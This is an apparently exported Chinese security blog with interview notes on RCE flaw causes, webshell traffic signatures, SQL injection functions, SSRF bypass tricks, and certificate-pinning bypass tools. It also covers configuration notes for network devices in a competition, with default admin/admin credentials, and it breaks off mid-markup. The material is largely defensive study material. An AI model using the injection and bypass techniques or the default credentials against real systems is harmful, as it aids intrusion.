title="weblogic漏洞原理"></a>weblogic漏洞原理</h2><p>WebLogic是Oracle发布的一个基于JAVAEE架构的web中间件 </p><h2 id="Thinkphp-漏洞"><a href="#Thinkphp-漏洞" class="headerlink" title="Thinkphp 漏洞"></a>Thinkphp 漏洞</h2><p>该漏洞出现的原因在于ThinkPHP5框架底层对控制器名过滤不严，从而让攻击者可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞</p><p>Struts在使用某些tag等情况下可能存在 OGNL表达式注入漏洞，从而造成远程代码执行</p><h2 id="APP抓不到包怎么办"><a href="#APP抓不到包怎么办" class="headerlink" title="APP抓不到包怎么办"></a>APP抓不到包怎么办</h2><p>Burp+Xposed+JustTrustMe抓包<br>通过反编译apk<br>使用安卓7.0以下的版本</p><p>dnslog你就把他理解成你自己的一个外网服务器，因为你自己的电脑常规来说是局域网，<br>所以需要一个外网服务器判断服务器是否出网或命令执行是否成功。</p><h2 id="1-怎么判断报警是不是误报？"><a href="#1-怎么判断报警是不是误报？" class="headerlink" title="1.怎么判断报警是不是误报？"></a>1.怎么判断报警是不是误报？</h2><p>1.根据返回包判断是否成功  判断报警，把报警日志里IP放到情报威胁平台分析，同时分析请求包返回包包，注重xff和x-real-ip，还有webshell的流量特征</p><h2 id="2-用过那些安全设备？设备的功能有哪些？"><a href="#2-用过那些安全设备？设备的功能有哪些？" class="headerlink" title="2.用过那些安全设备？设备的功能有哪些？"></a>2.用过那些安全设备？设备的功能有哪些？</h2><ol start="2"><li>设备基本分为监控 阻断 两种</li></ol><h2 id="3-怎么判断是否是真实的外部攻击？"><a href="#3-怎么判断是否是真实的外部攻击？" class="headerlink" title="3.怎么判断是否是真实的外部攻击？"></a>3.怎么判断是否是真实的外部攻击？</h2><p>3 真实攻击具备高线程 具有非正常用户访问特征，以及变异数据包</p><h2 id="webshell特征"><a href="#webshell特征" class="headerlink" title="webshell特征"></a>webshell特征</h2><p>冰蝎2.0   强特征是accept里面有个q&#x3D;.2<br>蚁剑是ua有answord    蚁剑的加密特征是以 “0x…..&#x3D;”开头<br>哥斯拉pass字段<br>冰蝎3.0    Content-Type: application&#x2F;octet-stream<br>菜刀流量存在一些特征字 eval  base64</p><h2 id="SQL注入-报错注入常用函数"><a href="#SQL注入-报错注入常用函数" class="headerlink" title="SQL注入  报错注入常用函数"></a>SQL注入  报错注入常用函数</h2><p>floor（）<br>updatexml()<br>extravalue()<br>exp()<br>multipoit()</p><p>布尔注入 函数<br>ascii()<br>substr()<br>hex()</p><p>AWVS扫描器的特征<br>主要是看请求包中是否含有<br>acunetix  wvs 字段</p><p>Nessus扫描器的特征<br>nessus字段</p><p>XXE漏洞<br>修复：过滤用户提交的XML数据<br>使用开发语言提供的禁用外部实体的方法<br>禁止外部实体引入</p><p>xss<br>对字符实体进行转义、<br>使用HTTP Only来禁JavaScript读取Cookie值、<br>输入时校验、浏览器与Web应用端采用相同的字符编码</p><p>csrf<br>筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、<br>检验Referer</p><p>越权<br>对参数的白名单过滤<br>对权限的控制管理重新设计与限制<br>限制下载文件的类型</p><p>ssrf绕过<br>进制转换<br>利用句号<br>利用@<br>利用短地址<br>协议 DIct SFTP   TFTP LDAP Gopher</p><p>修复<br>禁用一些协议，<br>设置白名单，限制访问内网ip<br>设置统一错误页面避免用户根据错误信息判断端口开发状态</p><h2 id="SQL注入-原理"><a href="#SQL注入-原理" class="headerlink" title="SQL注入 原理"></a>SQL注入 原理</h2><p>程序开发过程中不注意规范书写sql语句和对特殊字符进行过滤</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>关闭 SQL 错误回显<br>前端输入字符白名单验证<br>对输入的特殊字符使用转义处理<br>SQL 服务运行于专门的账号，并且使用最小权限<br>限制 SQL 服务的远程访问，只开放给特定开发人员<br>使用成熟的 waf<br>预编译</p><p>基线检查</p><p>对操作系统，数据库以及中间件等服务进行一些<br>安全配置的检查。(版本,弱口令）。</p><p>正向代理和反向代理的区别</p><p>正向代理代理的是客户端,反向代理代理的是服务端<br>正向代理是在客户端搭建，反向代理是在服务端搭建<br>正向代理主要目的是解决访问限制问题<br>反向代理起到安全防护的作用</p>]]></content>
      
      
      <categories>
          
          <category> -信息安全技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全管理与评估笔记</title>
      <link href="/posts/25174.html"/>
      <url>/posts/25174.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="神州数码设备"><a href="#神州数码设备" class="headerlink" title="神州数码设备"></a>神州数码设备</h1><p>三层交换机CS6200端口选COM1，波特率选115200</p><p>二层交换机S4600、无线交换机DCWS-6028、路由器DCR-2855、防火墙DCFW-1800E端口选COM1，波特率选9600。</p><p>还有路由器和防火墙缺省登陆用户名：admin，密码：admin。</p><p><em><strong>*最后在*</strong></em><em><strong>*SecureCRT*</strong></em><em><strong>*超级终端下输入*</strong></em><em><strong>*CLI*</strong></em><em><strong>*命令恢复出厂设置：*</strong></em></p><ol><li>三层交换机CS6200、二层交换机S4600、无线交换机DCWS-6028恢复出厂设置命令：</li></ol><p>​    特权模式下：</p><p>​             Switch#set default   </p><p>​             Switch#write</p><p>​             Switch#reload</p><p>  2.路由器DCR-2855<a href="https://so.csdn.net/so/search?q=%E6%81%A2%E5%A4%8D%E5%87%BA%E5%8E%82%E8%AE%BE%E7%BD%AE&spm=1001.2101.3001.7020">恢复出厂设置</a>命令：</p><p>​    特权模式下：Router#delete startup-config</p><p>​                          Router#reboot</p><p> 3.防火墙DCFW-1800E恢复出厂设置命令：</p><p>​    特权模式下：DCFW-1800#unset all</p><p>交换机</p><p>1）进boot  启动时按ctr+b进入boot  </p><p>2）恢复密码  Boot startup-config null</p><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(Config)#telnet-server enable   开启telnet服务</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#authentication line vty login local #打开本地验证方式，其中pr</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#username test privilege 15 password 0 test #为交换机设置Telnet授权用户和口令并使用命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(Config)#banner login WRANING！！！！！ 设置登录警告语</span><br></pre></td></tr></table></figure><p><strong>配置允许Telnet管理交换机的地址限制（单独IP或IP地址段）</strong></p><p>限制单个IP允许Telnet登录交换机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">switch(config)#authentication security ip 192.168.1.2</span><br></pre></td></tr></table></figure><p>限制允许IP地址段Telnet登录交换机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">switch(config)#access-list 1 permit 192.168.1.0 0.0.0.255</span><br><span class="line">switch(config)#authentication ip access-class 1 in</span><br></pre></td></tr></table></figure><p>保存配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch#write</span><br></pre></td></tr></table></figure><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">switch(config)#ssh-server enable 打开交换机的SSH服务器功能</span><br><span class="line">switch(config)#username DCN privilege 15 password DCN  配置SSH客户端软件登录到交换机的用户名和密码</span><br><span class="line">switch(config)#ssh-server timeout 120  设置SSH认证超时时间</span><br><span class="line">switch(config)#ssh-server authentication-retries 5  设置SSH认证重试次数</span><br></pre></td></tr></table></figure><h2 id="SNMP-网管系统相关"><a href="#SNMP-网管系统相关" class="headerlink" title="SNMP{网管系统相关}"></a>SNMP{网管系统相关}</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">snmp-server enable       //开启SNMP代理服务器功能  使用no关闭</span><br><span class="line">Snmp-server enable traps  #交换机若要通过网管软件进行配置管理，必须使用该命令</span><br><span class="line">snmp-server community ro DCN   //设置交换机的只读团体字符串</span><br><span class="line">snmp-server community rw DCN  //设置交换机的读写团体字符串</span><br><span class="line"></span><br><span class="line">snmp-server enable traps mac-notification  # mac变化就发送trap</span><br><span class="line">snmp-server securityip 1.1.1.1   #设置允许访问本交换机的网管的安全IP地址</span><br><span class="line">Snmp-server host 172.16.100.21 v2c DCN2011   #交换机SNMP的traps的网管IPv4地址</span><br><span class="line">mac-address-table violation-trap-interval 35  #操作发送trap信息的时间间隔</span><br><span class="line">Snmp-server engineid   #配置当前引擎号</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>指定登录配置模式的密码</strong>：</p><p>Enable password level {visitor|admin}</p><p><strong>配置交换机的用户名密码</strong>：</p><p>username admin privilege 15 password 0 xxx密码</p><p><strong>配置enable密码为xxx</strong>：</p><p>enable password 0 xxx （level 15）可选</p><p><strong>配置登录时认证</strong>：</p><p>authentication line vty login local</p><h2 id="OSPF-MD5"><a href="#OSPF-MD5" class="headerlink" title="OSPF MD5"></a>OSPF MD5</h2><p>需要注意在 OSPF 协议中声明发送 MD5 &#x3D;&#x3D;消息 key 验证&#x3D;&#x3D;</p><p>关于 FW 的 OSPF 操作要注意先声明 router-id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip vrouter trust-vr    FW进⼊路由配置模式</span><br><span class="line">ip ospf authentication message-digest    操作 OSPF 认证模式为消息</span><br><span class="line">ip ospf message-digest-key 1 md5 xxxx（密钥）   操作 OSPF 认证模式为 MD5 Hash admin</span><br></pre></td></tr></table></figure><p><strong>FW</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FW(config)# ip vrouter trust-vr</span><br><span class="line">FW(config-vrouter)# router ospf</span><br><span class="line">FW(config-router)# router-id 1.1.1.1</span><br><span class="line">FW(config-router)# network 9.0.0.1/30 area 0</span><br><span class="line">FW(config-router)# network 10.0.0.1/30 area 0</span><br><span class="line">FW(config-router)# area 0 authentication message-digest</span><br><span class="line"></span><br><span class="line">FW(config)# int aggregate1</span><br><span class="line">FW(config-if-agg1)# ip ospf authentication message-digest</span><br><span class="line">FW(config-if-agg1)# ip ospf message-digest-key 1 md5 admin</span><br><span class="line">FW(config)# int aggregate1</span><br><span class="line">FW(config-if-agg1)# ip ospf authentication message-digest</span><br><span class="line">FW(config-if-agg1)# ip ospf message-digest-key 1 md5 admin</span><br></pre></td></tr></table></figure><p><strong>RS</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CS6200-28X-EI(config)#router ospf 1</span><br><span class="line">CS6200-28X-EI(config-router)#network 192.168.100.0/24 area 0    宣告直连网段</span><br><span class="line">CS6200-28X-EI(config-router)#area 0 authentication message-digest</span><br><span class="line">CS6200-28X-EI(config)#int vlan 100</span><br><span class="line">CS6200-28X-EI(config-if-vlan100)#ip ospf authentication message-digest</span><br><span class="line">CS6200-28X-EI(config-if-vlan100)#ip ospf message-digest-key 1 md5 admin</span><br><span class="line">CS6200-28X-EI(config-if-vlan100)#exit</span><br></pre></td></tr></table></figure><p><strong>WS</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WS(config)#router ospf 1</span><br><span class="line">WS(config-router)#network 10.0.0.0/30 area 0</span><br><span class="line">CS6200-28X-EI(config-router)#area 0 authentication message-digest</span><br><span class="line">WS(config-router)#exit</span><br><span class="line">WS(config)#int vlan 9</span><br><span class="line">WS(config-if-vlan9)#ip ospf authentication message-digest</span><br><span class="line">WS(config-if-vlan9)#ip ospf message-digest-key 1 md5 admin</span><br><span class="line">WS(config-if-vlan9)#exit</span><br><span class="line">WS(config)#int vlan 100</span><br><span class="line">WS(config-if-vlan100)#ip ospf authentication message-digest</span><br><span class="line">WS(config-if-vlan100)#ip ospf message-digest-key 1 md5 admin</span><br><span class="line">WS(config-if-vlan100)#exit</span><br></pre></td></tr></table></figure><p>   show ip ospf neighbor</p><h2 id="修改链路-Trunk-模式"><a href="#修改链路-Trunk-模式" class="headerlink" title="修改链路{Trunk}模式"></a>修改链路{Trunk}模式</h2><p>（1）进入相应端口：Switch(config)#interface Ethernet 0&#x2F;1</p><p>（2）修改模式：        Switch(config-if)#switchport mode trunk</p><p>注意：如果是三层交换机，在修改模式先封装802.1协议：</p><p>Switch(config-if)#switchport trunk encapsulation dot1q</p><h2 id="端口安全配置"><a href="#端口安全配置" class="headerlink" title="端口安全配置"></a>端口安全配置</h2><p>1、启用和禁用端口安全功能：</p><p>启用：Switch(config-if)# switchport port-security</p><p>禁用：Switch(config-if)# no switchport port-security</p><p>2、设置接口上安全地址的最大个数（1~128）</p><p>Switch(config-if)#switchport port-security maximum 1</p><p>3、设置处理违例的方式</p><p>Switch(config-if)#switchport port-security violation shutdown</p><p>4、手工配置接口上的安全地址</p><p>Switch(config-if)#switchport port-security mac-address 00d0.d373.B060</p><p>5、查看安全配置：</p><p>Switch#show port-security</p><h2 id="防ARP扫描"><a href="#防ARP扫描" class="headerlink" title="防ARP扫描"></a>防ARP扫描</h2><p>分为<strong>基于端口</strong>和<strong>基于IP</strong></p><p><strong>Trust port</strong>、<strong>supertrust-port</strong>、 <strong>trust ip</strong> </p><p>启用trust port的端口则取消对该端口进行基于端口方式anti-arp的防护，</p><p>启用trust ip 则禁用对该ip的基于IP方式的anti-arp防护</p><p>启用supertrust-port的端口则取消该端口 的所有anti-arp防护</p><p>举例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SwitchB(config)#anti-arpscan enable   开启防ARP扫描</span><br></pre></td></tr></table></figure><p><strong>设置信任端口或超级信任端口，信任端口ARP不对此进行限制</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SwitchB(Config-If-Ethernet1/1 )#anti-arpscan trust port  </span><br><span class="line"></span><br><span class="line">SwitchB(Config-If-Ethernet1/1 )#anti-arpscan trust IP</span><br></pre></td></tr></table></figure><p>启动自动恢复功能，被禁端口或ip超过一段时间自动恢复正常</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SwitchB(config)#Anti-arpscan recovery enable</span><br></pre></td></tr></table></figure><p>配置自动恢复时间，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SwitchB(config)#Anti-arpscan recovery time</span><br></pre></td></tr></table></figure><p>如：</p><p>Anti-arpscan recovery time 3600</p><p>启用防ARP扫描日志功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SwitchB(config)#Anti-arpscan log enable</span><br></pre></td></tr></table></figure><p>启动防ARP扫描的SNMP TRAP功能，网关软件可以收到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SwitchB(config)#Anti-arpscan trap enable</span><br></pre></td></tr></table></figure><p>查看配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SwitchB(config)#Show anti-arpscan trust port</span><br></pre></td></tr></table></figure><h2 id="端口隔离"><a href="#端口隔离" class="headerlink" title="端口隔离"></a>端口隔离</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SwitchB(config)# isolate-port group xxx</span><br><span class="line">SwitchB(config)# isolate-port group xxx switchport interface e1/0/4-8</span><br></pre></td></tr></table></figure><p><strong>启用端口隔离</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SwitchB(config)# isolate-port apply L2/L3/all  (l2表示隔离二层流量 L3表示隔离3层流量  all表示隔离所有流量)</span><br></pre></td></tr></table></figure><h2 id="环路检测"><a href="#环路检测" class="headerlink" title="环路检测"></a>环路检测</h2><p><strong>启用环路检测并设置环路检测时间间隔</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS(config)#loopback-detection interval-time 10 10</span><br></pre></td></tr></table></figure><p><strong>绑定vlan40</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS(config-if-ethernet1/0/4)#loopback-detection specified-vlan 40</span><br></pre></td></tr></table></figure><p><strong>发现环路后关闭端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS(config-if-ethernet1/0/4)#loopback-detection control shutdown</span><br></pre></td></tr></table></figure><p><strong>端口关闭后的恢复时间</strong> 30分钟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS(config)#loopback-detection control-recovery timeout 1800</span><br></pre></td></tr></table></figure><h2 id="端口聚合-加大带宽"><a href="#端口聚合-加大带宽" class="headerlink" title="端口聚合-加大带宽"></a>端口聚合-加大带宽</h2><p><strong>命令：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Port-group 1~128 mode &#123;active|passive|on&#125;</span><br><span class="line">lcap n</span><br></pre></td></tr></table></figure><p>1~128为Port Channel的组号，范围为1～128；</p><p><strong>active</strong>启动端口的LACP协议，并设置为Active模式；</p><p><strong>passive</strong>启动端口的LACP协议，并且设置为Passive模式；</p><p><strong>on</strong>强制端口加入Port Channel，不启动LACP协议</p><p><strong>举例：</strong>加大RS与FW之间的带宽 RS通过e1&#x2F;0&#x2F;1-2口与FW连接 对应vlan49；50</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RS(config)# port-group 1~128 随便一个数</span><br><span class="line">RS(config-e1/0/1-2)#switchport mode trunk</span><br><span class="line">RS(config-e1/0/1-2)#switchport trunk allowed vlan49；50</span><br><span class="line">RS(config-e1/0/1-2)#port-group 1 mode active</span><br></pre></td></tr></table></figure><p><strong>FW操作</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FW(config)#int aggregate1</span><br><span class="line">FW(config-if-aggregate1)#IP add 0.0.0.0/0</span><br><span class="line"></span><br><span class="line">FW(config)#int aggregate1.49</span><br><span class="line">FW(config-if-aggregate1.49)#zone trust</span><br><span class="line">FW(config-if-aggregate1.49)#ip add 10.0.0.1/30</span><br><span class="line"></span><br><span class="line">FW(config)#int aggragate1.50</span><br><span class="line">FW(config-if-aggregate1.50)#zone untrust</span><br><span class="line">FW(config-if-aggregate1.50)#ip add 218.5.18.1/27</span><br><span class="line"></span><br><span class="line">FW(config)#int e0/1</span><br><span class="line">FW(config-if-e0/1)#aggregate aggregate1</span><br><span class="line">FW(config-if-e0/1)#int e0/2</span><br><span class="line">FW(config-if-e0/2)#aggregate aggregate1</span><br></pre></td></tr></table></figure><h2 id="DHCP-SNOOPING配置"><a href="#DHCP-SNOOPING配置" class="headerlink" title="DHCP SNOOPING配置"></a>DHCP SNOOPING配置</h2><p>网络中已存在指定的DHCP Server，但在用户 端，还是有用户&#x3D;&#x3D;私自架设的DHCP Server&#x3D;&#x3D;，为 了不影响其他用户的地址获得。在Switch上运 行DHCP Snooping功能，防止用户端的DHCP  Server影响其他用户</p><p>将交换机的接口划分为&#x3D;&#x3D;TRUST&#x3D;&#x3D;和&#x3D;&#x3D;UNTRUST&#x3D;&#x3D;两个角色。当某一个接口被设置为trust接口时， 那么该接口的dhcp offer报文会被放行，反 之，接口为untrust时，被拒绝。</p><p><strong>开启DHCP SNOOPING功能</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS(config)#IP dhcp snooping enable</span><br></pre></td></tr></table></figure><p><strong>设置DHCP Snooping功能将作用于哪些 VLAN</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS(config)#ip dhcp snooping vlan 10</span><br></pre></td></tr></table></figure><p><strong>将该端口设置为信任端口</strong> 一般是trunk口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS(config-e1/0/20)#ip dhcp snooping trust</span><br></pre></td></tr></table></figure><p><strong>开启DHCP监听捆绑功能</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS(config)#ip dhcp snooping binding enable</span><br></pre></td></tr></table></figure><p><strong>防止ARP欺骗</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS(config)#ip dhcp snooping binding arp</span><br></pre></td></tr></table></figure><p><strong>启动DHCP Snooping绑定user功能、操作所属 VLNA 40 业务的流量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS(config-e1/0/4-8)#ip dhcp snooping binding user-control</span><br></pre></td></tr></table></figure><p><strong>一旦发现私设DHCP服务器则关闭端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS(config-e1/0/4)#ip dhcp snooping action shutdown</span><br></pre></td></tr></table></figure><h2 id="限制吞吐量-收包速率大小"><a href="#限制吞吐量-收包速率大小" class="headerlink" title="限制吞吐量-收包速率大小"></a>限制吞吐量-收包速率大小</h2><p><strong>举例：</strong> 设置交换机1&#x2F;0&#x2F;8-10号端口（千兆）的报文违背速率为10000pps，端口恢复时间为1200s</p><p>两种方法</p><ol><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS(config-e1/0/8-10)#rate-violation all 10000 recovery 1200 </span><br></pre></td></tr></table></figure><ol start="2"><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS(config-e1/0/8-10)#rate-violation control shutdown recovery 1200</span><br></pre></td></tr></table></figure><p><strong>每隔一段时间统计</strong></p><p><strong>举例：</strong>统计端口速率统计时间为20秒 每隔20秒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#port-rate-statistics interval 20</span><br></pre></td></tr></table></figure><p><strong>指定数据包大小</strong></p><p><strong>举例</strong>：数据包大小为1600字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#mtu 1600</span><br></pre></td></tr></table></figure><h2 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h2><p><strong>一般是勒索病毒</strong>  阻止相应端口流量</p><p>1-99：标准ACL<br>100-199：扩展ACL<br><em><strong>ACl配置过程中一定要用反掩码！！！</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access-list access-list-number permit/deny protocol +源地址+反码 +目标地址+反码+operan(It小于，gt大于，eq等于，neq不等于.)+端口号</span><br></pre></td></tr></table></figure><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access-list 101 deny tcp any host 192.168.1.1 eq www </span><br></pre></td></tr></table></figure><p>将所有主机访问192.168.1.1这个地址网页服务（WWW）TCP连接的数据包丢弃。</p><p><strong>&#x3D;&#x3D;考试例题：&#x3D;&#x3D;</strong></p><p>2017年勒索蠕虫病毒席卷全球，爆发了堪称史上最大规模的网络攻击，通过对总部核心交换机DCRS所有业务VLAN下配置访问控制策略实现双向安全防护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DCRS-6028(config)#ip access-list extended dyan01</span><br><span class="line"></span><br><span class="line">DCRS-6028(config-ip-ext-nacl-dyan01)#deny tcp any-source any-destination d-port 135</span><br><span class="line"></span><br><span class="line">DCRS-6028(config-ip-ext-nacl-dyan01)#deny udp any-source any-destination d-port 135</span><br><span class="line"></span><br><span class="line">DCRS-6028(config-ip-ext-nacl-dyan01)#deny tcp any-source any-destination d-port 137-139</span><br><span class="line"></span><br><span class="line">DCRS-6028(config-ip-ext-nacl-dyan01)#deny udp any-source any-destination d-port 137-139</span><br><span class="line"></span><br><span class="line">DCRS-6028(config-ip-ext-nacl-dyan01)#deny tcp any-source any-destination d-port 445 </span><br><span class="line"></span><br><span class="line">DCRS-6028(config-ip-ext-nacl-dyan01)#deny udp any-source any-destination d-port 445</span><br><span class="line"></span><br><span class="line">DCRS-6028(config-ip-ext-nacl-dyan01)#permit tcp any-source any-destination</span><br></pre></td></tr></table></figure><h2 id="免费ARP"><a href="#免费ARP" class="headerlink" title="免费ARP"></a>免费ARP</h2><p>IP gratutions-arp </p><p><strong>设置免费ARP报文的发送时间间隔</strong></p><p><strong>举例</strong>：为减少内部ARP广播询问VLAN网关地址，在全局下配置CS每隔300S发送免费ARP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#IP gratutions-arp 300</span><br></pre></td></tr></table></figure><p><strong>显示免费arp发送功能的配置信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#show IP gratutions-arp</span><br></pre></td></tr></table></figure><h2 id="生成树协议"><a href="#生成树协议" class="headerlink" title="生成树协议"></a>生成树协议</h2><p>不知道 <strong>直接上例题</strong></p><p><strong>例题</strong>：总部启用MSTP协议，name为DCN2011、 Revision-level 1，实例1中包括VLAN10；实例2中包括VLAN20、要求两条链路负载分担,其中VLAN10业务数据在E1&#x2F;0&#x2F;4进行数据转发，要求VLAN20业务数据在E1&#x2F;0&#x2F;5进行数据转发，通过在DCWS两个端口设置COST值 2000000实现&#x3D;&#x3D;;&#x3D;&#x3D;配置DCRS连接终端接口立即进入转发模式且在收到BPDU时自动关闭端口&#x3D;&#x3D;;&#x3D;&#x3D;防止从DCWS方向的根桥抢占攻击;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 